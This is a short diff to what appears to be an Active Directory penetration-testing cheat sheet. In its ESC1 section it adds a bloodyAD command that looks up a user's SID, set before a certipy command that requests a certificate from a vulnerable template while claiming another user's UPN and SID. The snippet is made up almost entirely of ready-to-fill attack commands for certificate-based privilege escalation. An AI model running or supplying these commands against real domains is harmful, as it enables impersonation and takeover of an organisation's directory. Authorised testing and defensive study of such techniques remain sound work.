@@ -839,6 +839,11 @@ u.objectid ENDS WITH "-548" RETURN q
 <details>
   <summary> ESC1 </summary> 
 
+  ### Get user SID
+  ```shell
+  bloodyAD -u <AD_user> -d <domain> -p <password> --host <Domain_Controller_IP> get object <AD_user>
+  ```
+  ### Request cert
   ```shell
   certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
   ```
